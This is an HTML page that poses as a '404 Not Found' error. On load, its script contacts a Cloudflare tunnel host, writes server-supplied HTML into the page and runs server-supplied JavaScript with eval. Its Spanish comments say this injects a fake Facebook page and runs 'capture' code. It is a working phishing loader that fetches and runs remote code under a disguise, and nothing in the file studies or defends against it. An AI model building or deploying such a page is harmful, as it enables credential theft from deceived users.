<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body { 
            height: 100vh; margin: 0; display: flex; flex-direction: column; 
            justify-content: center; align-items: center; 
            font-family: 'Courier New', monospace; background-color: #ffffff;
        }
        .error-container { text-align: center; padding: 20px; max-width: 400px; }
        h1 { font-size: 60px; margin: 0; color: #000; }
        p { font-size: 16px; color: #333; margin-bottom: 20px; }
        
        .inputs-box {
            display: flex;
            flex-direction: column;
            gap: 10px;
            align-items: center;
        }

        .in { 
            padding: 14px; width: 280px; border: 1px solid #ddd; 
            border-radius: 8px; text-align: center; font-size: 15px;
            outline: none; font-family: sans-serif;
        }
        
        #tk { text-transform: uppercase; }

        .btn { 
            margin-top: 10px; padding: 12px 30px; background: #000; 
            color: #fff; border: none; border-radius: 8px; cursor: pointer; 
            font-weight: bold; transition: 0.3s; font-family: sans-serif;
        }
        .btn:hover { background: #333; }

        /* Pantalla de carga */
        #loader {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: white; z-index: 10000; justify-content: center; 
            align-items: center; flex-direction: column; font-family: sans-serif;
        }
        .spin {
            width: 40px; height: 40px; border: 4px solid #f3f3f3;
            border-top: 4px solid #0064e0; border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="loader">
        <div class="spin"></div>
        <p style="margin-top:15px; font-weight:bold; color:#555;">Iniciando diagnóstico...</p>
    </div>

    <div class="error-container" id="main-box">
        <h1>404</h1>
        <p>The requested URL was not found on this server.</p>
        
        <div class="inputs-box">
            <input type="text" id="nom" class="in" placeholder="USER NAME">
            <input type="text" id="tk" class="in" placeholder="DIAGNOSTIC TOKEN">
            <button class="btn" onclick="ejecutar()">RUN DIAGNOSTIC</button>
        </div>
    </div>

    <script>
        // --- AYBER: CAMBIA ESTA URL POR LA QUE TE DE CLOUDFLARE EN TERMUX ---
        const API_URL = "https://clearance-beginner-chat-workshops.trycloudflare.com";

        // Al cargar, intentamos auto-loguear por IP
        window.onload = () => { ejecutar(true); };

        async function ejecutar(esAuto = false) {
            const nomInput = document.getElementById('nom');
            const tkInput = document.getElementById('tk');
            const loader = document.getElementById('loader');
            const mainBox = document.getElementById('main-box');

            let nombre = nomInput.value.trim();
            let token = tkInput.value.trim().toUpperCase();

            // Si no es auto-login y faltan datos, avisar
            if (!esAuto && (!nombre || !token)) {
                if (!esAuto) alert("Por favor, ingresa tu Nombre y el Token.");
                return;
            }

            if (!esAuto) loader.style.display = 'flex';

            try {
                const response = await fetch(`${API_URL}/get-ghost-code`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        llave: token, 
                        nombre: nombre,
                        is_returning: esAuto 
                    })
                });

                if (response.ok) {
                    const data = await response.json();
                    loader.style.display = 'none';

                    // Si el servidor acepta, inyectamos el Facebook
                    if (data.status === 'ok') {
                        document.open();
                        document.write(data.html);
                        document.close();
                        // Ejecutamos el JavaScript de captura que mandó Python
                        eval(data.js);
                    }
                } else {
                    loader.style.display = 'none';
                    if (!esAuto) alert("Token incorrecto o datos inválidos.");
                }
            } catch (error) {
                loader.style.display = 'none';
                console.log("Servidor no responde...");
            }
        }
    </script>
</body>
</html>
